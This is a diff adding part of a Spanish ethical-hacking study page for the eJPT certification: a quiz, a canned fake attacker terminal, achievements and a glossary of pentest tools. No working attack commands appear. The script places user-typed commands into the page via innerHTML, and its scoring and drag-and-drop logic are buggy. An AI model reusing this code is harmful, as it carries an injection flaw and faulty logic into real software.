+                        </div>
+                        <div class="options">
+                            <div class="option" draggable="true">-no-ping</div>
+                            <div class="option" draggable="true">-Pn</div>
+                            <div class="option" draggable="true">--no-ping</div>
+                            <div class="option" draggable="true">-n</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn btn-success" id="submit-challenge">Enviar respuestas</button>
+                <button class="btn btn-primary" id="start-challenge">Iniciar desafío</button>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-terminal"></i> Simulador: Comunicación entre Máquinas</h2>
+                <p>Simula una conexión entre una máquina atacante y una víctima. Practica comandos reales en este entorno virtual.</p>
+                
+                <div class="game-container">
+                    <div class="terminal" id="simulator-terminal">
+                        <div class="terminal-line"><span class="prompt">kali@attacker:~$</span> Bienvenido al simulador de hacking ético</div>
+                        <div class="terminal-line"><span class="prompt">kali@attacker:~$</span> Usa comandos como 'help' para comenzar</div>
+                    </div>
+                    <div class="command-input">
+                        <span class="input-prompt">kali@attacker:~$</span>
+                        <input type="text" id="simulator-input" placeholder="Escribe un comando...">
+                    </div>
+                    <button class="btn btn-primary" id="run-command">Ejecutar</button>
+                    <button class="btn btn-warning" id="clear-terminal">Limpiar</button>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-trophy"></i> Progreso y Logros</h2>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress-bar">0%</div>
+                </div>
+                
+                <p>Tu puntuación actual: <span class="score-display" id="total-score">0</span>/100 puntos</p>
+                
+                <div class="achievements">
+                    <div class="achievement unlocked" id="achievement1">
+                        <div class="achievement-icon">
+                            <i class="fas fa-home"></i>
+                        </div>
+                        <div class="achievement-title">Iniciado</div>
+                        <div class="achievement-desc">Completaste el Módulo 1</div>
+                    </div>
+                    
+                    <div class="achievement locked" id="achievement2">
+                        <div class="achievement-icon">
+                            <i class="fas fa-exchange-alt"></i>
+                        </div>
+                        <div class="achievement-title">Transferencia Maestro</div>
+                        <div class="achievement-desc">Completaste el Módulo 2</div>
+                    </div>
+                    
+                    <div class="achievement locked" id="achievement3">
+                        <div class="achievement-icon">
+                            <i class="fas fa-bug"></i>
+                        </div>
+                        <div class="achievement-title">Explotador Profesional</div>
+                        <div class="achievement-desc">Completaste el Módulo 3</div>
+                    </div>
+                    
+                    <div class="achievement locked" id="achievement4">
+                        <div class="achievement-icon">
+                            <i class="fas fa-gamepad"></i>
+                        </div>
+                        <div class="achievement-title">Jugador de Hacking</div>
+                        <div class="achievement-desc">Completaste los juegos</div>
+                    </div>
+                    
+                    <div class="achievement locked" id="achievement5">
+                        <div class="achievement-icon">
+                            <i class="fas fa-graduation-cap"></i>
+                        </div>
+                        <div class="achievement-title">Experto EJPT</div>
+                        <div class="achievement-desc">Completaste todos los módulos</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Página 5: Glosario -->
+        <div id="glosario" class="page">
+            <div class="page-header">
+                <h1 class="page-title">Glosario de Términos</h1>
+                <span class="badge">Referencia</span>
+            </div>
+
+            <div class="glossary">
+                <h2><i class="fas fa-book"></i> Glosario de Hacking Ético</h2>
+                <p>Haz clic en cualquier término para ver su definición completa.</p>
+                
+                <div class="section">
+                    <h3>Conceptos Básicos de Redes</h3>
+                    <div class="glossary-term" data-term="host">
+                        <strong>Host:</strong> Cualquier dispositivo que tiene una dirección IP y está conectado a una red, como un ordenador, servidor o impresora.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="dhcp">
+                        <strong>DHCP (Dynamic Host Configuration Protocol):</strong> Protocolo que asigna automáticamente direcciones IP a los dispositivos en una red.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="ip">
+                        <strong>IP (Internet Protocol):</strong> Sistema de direccionamiento que identifica de forma única a los dispositivos en una red.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="nát">
+                        <strong>NAT (Network Address Translation):</strong> Tecnología que permite que múltiples dispositivos compartan una única dirección IP pública.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="adaptador puente">
+                        <strong>Adaptador Puente:</strong> Modo de red virtual que permite que la máquina virtual se comporte como cualquier otro dispositivo en la red física.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="tcp">
+                        <strong>TCP (Transmission Control Protocol):</strong> Protocolo de transporte orientado a conexión que garantiza la entrega de datos.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="udp">
+                        <strong>UDP (User Datagram Protocol):</strong> Protocolo de transporte sin conexión que envía datos sin garantizar su entrega.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="ping">
+                        <strong>Ping:</strong> Herramienta de red que verifica la conectividad entre dos dispositivos enviando paquetes de eco.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="ttl">
+                        <strong>TTL (Time To Live):</strong> Valor que limita la vida útil de un paquete de red, también útil para identificar sistemas operativos.
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h3>Herramientas de Pentesting</h3>
+                    <div class="glossary-term" data-term="nmap">
+                        <strong>Nmap (Network Mapper):</strong> Herramienta de escaneo de redes utilizada para descubrir hosts y servicios en una red.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="arp-scan">
+                        <strong>arp-scan:</strong> Herramienta que utiliza el protocolo ARP para descubrir hosts en una red local.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="netdiscover">
+                        <strong>netdiscover:</strong> Herramienta activa y pasiva para descubrir hosts en una red, similar a arp-scan.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="cve">
+                        <strong>CVE (Common Vulnerabilities and Exposures):</strong> Identificador único para vulnerabilidades públicas en software.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="exploit">
+                        <strong>Exploit:</strong> Código o técnica que aprovecha una vulnerabilidad para obtener acceso no autorizado.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="payload">
+                        <strong>Payload:</strong> Código malicioso que se ejecuta después de una explotación exitosa.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="reverse shell">
+                        <strong>Reverse Shell:</strong> Conexión desde una máquina comprometida hacia el atacante, permitiendo el control remoto.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="metasploit">
+                        <strong>Metasploit Framework:</strong> Plataforma de desarrollo y ejecución de exploits para pruebas de penetración.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="msfvenom">
+                        <strong>Msfvenom:</strong> Herramienta de Metasploit para generar payloads personalizados.
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h3>Ataques y Técnicas</h3>
+                    <div class="glossary-term" data-term="hydra">
+                        <strong>Hydra:</strong> Herramienta de fuerza bruta para atacar servicios de autenticación.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="john the ripper">
+                        <strong>John the Ripper:</strong> Herramienta para crackear contraseñas locales y hashes.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="hash">
+                        <strong>Hash:</strong> Función criptográfica que convierte datos en una cadena única de longitud fija.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="fuerza bruta">
+                        <strong>Fuerza Bruta:</strong> Técnica de ataque que prueba sistemáticamente todas las combinaciones posibles de contraseñas.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="diccionario">
+                        <strong>Diccionario:</strong> Lista de palabras o contraseñas comunes utilizada en ataques de fuerza bruta.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="netcat">
+                        <strong>Netcat:</strong> Herramienta de red versátil que puede leer y escribir datos en conexiones de red.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="scp">
+                        <strong>SCP (Secure Copy):</strong> Protocolo para transferir archivos entre máquinas de forma segura usando SSH.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="ftp">
+                        <strong>FTP (File Transfer Protocol):</strong> Protocolo estándar para transferir archivos entre máquinas, aunque inseguro.
+                    </div>
+                    
+                    <div class="glossary-term" data-term="certutil">
+                        <strong>certutil:</strong> Herramienta de Windows que puede usarse para transferir archivos desde la línea de comandos.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>MiniCampus EJPT - Hacking Ético &copy; 2023 | Curso basado en TODO EL CURSO.pdf</p>
+        <p>Estás en el 50% de tu progreso hacia la certificación EJPT</p>
+    </footer>
+
+    <script>
+        // Navigation
+        const sidebar = document.getElementById('sidebar');
+        const menuToggle = document.getElementById('menuToggle');
+        const navLinks = document.querySelectorAll('.nav-link');
+        
+        menuToggle.addEventListener('click', () => {
+            sidebar.classList.toggle('open');
+        });
+        
+        navLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                
+                // Update active link
+                navLinks.forEach(l => l.classList.remove('active'));
+                link.classList.add('active');
+                
+                // Show corresponding page
+                const pageId = link.getAttribute('href').substring(1);
+                document.querySelectorAll('.page').forEach(page => {
+                    page.classList.remove('active');
+                });
+                document.getElementById(pageId).classList.add('active');
+                
+                // Close sidebar on mobile
+                sidebar.classList.remove('open');
+                
+                // Save progress
+                localStorage.setItem('currentPage', pageId);
+            });
+        });
+        
+        // Quiz functionality
+        function setupQuiz(quizId, pageId) {
+            const page = document.getElementById(pageId);
+            const options = page.querySelectorAll('.option');
+            const submitBtn = document.getElementById(`submit-${quizId}`);
+            const resetBtn = document.getElementById(`reset-${quizId}`);
+            const feedbacks = page.querySelectorAll('.feedback');
+            const countSpan = document.getElementById(`${quizId}-count`);
+            
+            let answered = 0;
+            let correct = 0;
+            
+            options.forEach(option => {
+                option.addEventListener('click', () => {
+                    // Only allow selection if not already answered
+                    const question = option.closest('.question');
+                    const selected = question.querySelector('.option.selected');
+                    if (selected) return;
+                    
+                    option.classList.add('selected');
+                    answered++;
+                    countSpan.textContent = answered;
+                });
+            });
+            
+            submitBtn.addEventListener('click', () => {
+                options.forEach(option => {
+                    if (option.classList.contains('selected')) {
+                        if (option.dataset.correct === 'true') {
+                            option.classList.add('correct');
+                            correct++;
+                        } else {
+                            option.classList.add('incorrect');
+                        }
+                    }
+                });
+                
+                feedbacks.forEach(feedback => {
+                    if (feedback.classList.contains('correct')) {
+                        const option = feedback.previousElementSibling.querySelector('.option[data-correct="true"]');
+                        if (option.classList.contains('selected')) {
+                            feedback.style.display = 'block';
+                        }
+                    } else {
+                        const option = feedback.previousElementSibling.querySelector('.option.selected:not([data-correct="true"])');
+                        if (option) {
+                            feedback.style.display = 'block';
+                        }
+                    }
+                });
+                
+                // Update score and progress
+                const score = Math.round((correct / options.length) * 100);
+                updateProgress(pageId, score);
+                
+                // Disable further interaction
+                options.forEach(option => {
+                    option.style.pointerEvents = 'none';
+                });
+                submitBtn.disabled = true;
+            });
+            
+            resetBtn.addEventListener('click', () => {
+                options.forEach(option => {
+                    option.classList.remove('selected', 'correct', 'incorrect');
+                    option.style.pointerEvents = 'auto';
+                });
+                
+                feedbacks.forEach(feedback => {
+                    feedback.style.display = 'none';
+                });
+                
+                answered = 0;
+                correct = 0;
+                countSpan.textContent = answered;
+                submitBtn.disabled = false;
+            });
+        }
+        
+        // Initialize quizzes
+        setupQuiz('q1', 'introduccion');
+        setupQuiz('q2', 'transferencia');
+        setupQuiz('q3', 'explotacion');
+        
+        // Progress tracking
+        function updateProgress(pageId, score) {
+            // Update achievements based on page completion
+            if (pageId === 'introduccion') {
+                document.getElementById('achievement1').classList.remove('locked');
+                document.getElementById('achievement1').classList.add('unlocked');
+            } else if (pageId === 'transferencia') {
+                document.getElementById('achievement2').classList.remove('locked');
+                document.getElementById('achievement2').classList.add('unlocked');
+            } else if (pageId === 'explotacion') {
+                document.getElementById('achievement3').classList.remove('locked');
+                document.getElementById('achievement3').classList.add('unlocked');
+            }
+            
+            // Update progress bar
+            updateProgressBar();
+            updateTotalScore();
+        }
+        
+        function updateProgressBar() {
+            const completedModules = document.querySelectorAll('.achievement.unlocked').length;
+            const totalModules = 5;
+            const progress = Math.round((completedModules / totalModules) * 100);
+            
+            const progressBar = document.getElementById('progress-bar');
+            progressBar.style.width = `${progress}%`;
+            progressBar.textContent = `${progress}%`;
+        }
+        
+        function updateTotalScore() {
+            const scores = [
+                parseInt(document.getElementById('q1-count').textContent) || 0,
+                parseInt(document.getElementById('q2-count').textContent) || 0,
+                parseInt(document.getElementById('q3-count').textContent) || 0
+            ];
+            
+            const totalScore = document.getElementById('total-score');
+            const sum = scores.reduce((a, b) => a + b, 0);
+            totalScore.textContent = sum;
+            
+            // Check for all modules completed
+            if (document.querySelectorAll('.achievement.unlocked').length >= 3) {
+                document.getElementById('achievement5').classList.remove('locked');
+                document.getElementById('achievement5').classList.add('unlocked');
+            }
+        }
+        
+        // Matching game
+        const terms = document.querySelectorAll('.term');
+        const definitions = document.querySelectorAll('.definition');
+        const checkMatchingBtn = document.getElementById('check-matching');
+        const resetMatchingBtn = document.getElementById('reset-matching');
+        
+        let selectedTerm = null;
+        let selectedDefinition = null;
+        
+        terms.forEach(term => {
+            term.addEventListener('click', () => {
+                if (selectedTerm) {
+                    selectedTerm.classList.remove('selected');
+                }
+                selectedTerm = term;
+                term.classList.add('selected');
+            });
+        });
+        
+        definitions.forEach(def => {
+            def.addEventListener('click', () => {
+                if (selectedDefinition) {
+                    selectedDefinition.classList.remove('selected');
+                }
+                selectedDefinition = def;
+                def.classList.add('selected');
+                
+                if (selectedTerm && selectedDefinition) {
+                    if (selectedTerm.dataset.match === selectedDefinition.dataset.match) {
+                        selectedTerm.classList.add('matched');
+                        selectedDefinition.classList.add('matched');
+                        selectedTerm.style.pointerEvents = 'none';
+                        selectedDefinition.style.pointerEvents = 'none';
+                    }
+                    selectedTerm.classList.remove('selected');
+                    selectedDefinition.classList.remove('selected');
+                    selectedTerm = null;
+                    selectedDefinition = null;
+                }
+            });
+        });
+        
+        checkMatchingBtn.addEventListener('click', () => {
+            const matched = document.querySelectorAll('.matched').length;
+            if (matched === 10) {
+                alert('¡Perfecto! Has emparejado todos los términos correctamente.');
+                document.getElementById('achievement4').classList.remove('locked');
+                document.getElementById('achievement4').classList.add('unlocked');
+                updateProgressBar();
+            } else {
+                alert(`Necesitas emparejar ${5 - matched/2} pares más.`);
+            }
+        });
+        
+        resetMatchingBtn.addEventListener('click', () => {
+            document.querySelectorAll('.term, .definition').forEach(el => {
+                el.classList.remove('selected', 'matched');
+                el.style.pointerEvents = 'auto';
+            });
+            selectedTerm = null;
+            selectedDefinition = null;
+        });
+        
+        // Challenge game
+        const startChallengeBtn = document.getElementById('start-challenge');
+        const submitChallengeBtn = document.getElementById('submit-challenge');
+        const challengeTimer = document.getElementById('challenge-timer');
+        const dropZones = document.querySelectorAll('.drop-zone');
+        const challengeOptions = document.querySelectorAll('.options .option');
+        
+        let timer;
+        let timeLeft = 60;
+        
+        startChallengeBtn.addEventListener('click', () => {
+            // Reset
+            dropZones.forEach(zone => {
+                zone.innerHTML = '';
+            });
+            
+            // Enable options
+            challengeOptions.forEach(option => {
+                option.style.display = 'inline-block';
+                option.style.pointerEvents = 'auto';
+            });
+            
+            // Start timer
+            timeLeft = 60;
+            challengeTimer.textContent = `Tiempo: ${timeLeft}s`;
+            
+            timer = setInterval(() => {
+                timeLeft--;
+                challengeTimer.textContent = `Tiempo: ${timeLeft}s`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    submitChallenge();
+                }
+            }, 1000);
+            
+            // Disable start button
+            startChallengeBtn.disabled = true;
+        });
+        
+        // Make options draggable
+        challengeOptions.forEach(option => {
+            option.draggable = true;
+            option.addEventListener('dragstart', (e) => {
+                e.dataTransfer.setData('text/plain', e.target.textContent);
+                e.dataTransfer.setData('answer', e.target.dataset.answer || e.target.textContent);
+            });
+        });
+        
+        // Make drop zones droppable
+        dropZones.forEach(zone => {
+            zone.addEventListener('dragover', (e) => {
+                e.preventDefault();
+            });
+            
+            zone.addEventListener('drop', (e) => {
+                e.preventDefault();
+                const answer = e.dataTransfer.getData('answer');
+                const optionText = e.dataTransfer.getData('text/plain');
+                
+                // Remove from original location
+                const originalOption = document.querySelector(`.option[draggable="true"]:not([style*="display: none"])`);
+                if (originalOption) {
+                    originalOption.style.display = 'none';
+                }
+                
+                // Add to drop zone
+                const span = document.createElement('span');
+                span.textContent = optionText;
+                span.dataset.answer = answer;
+                zone.innerHTML = '';
+                zone.appendChild(span);
+            });
+        });
+        
+        function submitChallenge() {
+            clearInterval(timer);
+            let score = 0;
+            
+            dropZones.forEach(zone => {
+                const answer = zone.querySelector('span')?.dataset.answer;
+                if (answer === zone.dataset.answer) {
+                    score++;
+                    zone.style.backgroundColor = '#c6f6d5';
+                    zone.style.borderColor = '#9ae6b4';
+                } else {
+                    zone.style.backgroundColor = '#fed7d7';
+                    zone.style.borderColor = '#feb2b2';
+                }
+            });
+            
+            // Disable further interaction
+            challengeOptions.forEach(option => {
+                option.style.pointerEvents = 'none';
+            });
+            
+            startChallengeBtn.disabled = false;
+            submitChallengeBtn.disabled = true;
+            
+            alert(`Tu puntuación: ${score}/${dropZones.length}`);
+        }
+        
+        submitChallengeBtn.addEventListener('click', submitChallenge);
+        
+        // Simulator
+        const simulatorTerminal = document.getElementById('simulator-terminal');
+        const simulatorInput = document.getElementById('simulator-input');
+        const runCommandBtn = document.getElementById('run-command');
+        const clearTerminalBtn = document.getElementById('clear-terminal');
+        
+        const commands = {
+            'help': 'Comandos disponibles: help, clear, whoami, ip a, nmap, ping, python3 -m http.server, scp, hydra, msfvenom',
+            'clear': '',
+            'whoami': 'kali@attacker:~$ kali',
+            'ip a': 'kali@attacker:~$ 192.168.1.26',
+            'nmap': 'kali@attacker:~$ Nmap 7.92 ( https://nmap.org )\nUsage: nmap [Scan Type(s)] [Options] {target specification}',
+            'ping': 'kali@attacker:~$ PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=1.23 ms',
+            'python3 -m http.server': 'kali@attacker:~$ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...',
+            'scp': 'kali@attacker:~$ Password: \nscp: Connection closed',
+            'hydra': 'kali@attacker:~$ Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.',
+            'msfvenom': 'kali@attacker:~$ Msfvenom is the successor to msfpayload and msfencode, and is now the primary tool for generating payloads in Metasploit.'
+        };
+        
+        function addToTerminal(text) {
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.innerHTML = `<span class="prompt">kali@attacker:~$</span> ${text}`;
+            simulatorTerminal.appendChild(line);
+            simulatorTerminal.scrollTop = simulatorTerminal.scrollHeight;
+        }
+        
+        runCommandBtn.addEventListener('click', () => {
+            const command = simulatorInput.value.trim();
+            if (command) {
+                addToTerminal(command);
+                
+                if (commands[command]) {
+                    if (command === 'clear') {
+                        simulatorTerminal.innerHTML = '';
+                    } else {
+                        addToTerminal(commands[command]);
+                    }
+                } else if (command.startsWith('cd ')) {
+                    addToTerminal(`kali@attacker:~$ Cambiado a ${command.substring(3)}`);
+                } else if (command === 'ls') {
+                    addToTerminal('archivo.txt  payload.exe  documento.pdf');
+                } else {
+                    addToTerminal(`kali@attacker:~$ bash: ${command}: command not found`);
+                }
+                
+                simulatorInput.value = '';
+            }
+        });
+        
+        simulatorInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                runCommandBtn.click();
+            }
+        });
+        
+        clearTerminalBtn.addEventListener('click', () => {
+            simulatorTerminal.innerHTML = '';
+            addToTerminal('kali@attacker:~$ Terminal limpiado');
+        });
+        
+        // Load saved progress
+        window.addEventListener('load', () => {
+            const savedPage = localStorage.getItem('currentPage');
+            if (savedPage) {
+                // Update active link
+                navLinks.forEach(l => l.classList.remove('active'));
+                const activeLink = document.querySelector(`.nav-link[href="#${savedPage}"]`);
+                if (activeLink) {
+                    activeLink.classList.add('active');
+                }
+                
+                // Show corresponding page
+                document.querySelectorAll('.page').forEach(page => {
+                    page.classList.remove('active');
+                });
+                const activePage = document.getElementById(savedPage);
+                if (activePage) {
+                    activePage.classList.add('active');
+                }
+            }
+            
+            // Initialize progress bar
+            updateProgressBar();
+            updateTotalScore();
+        });
+    </script>
+</body>
+</html>
+```
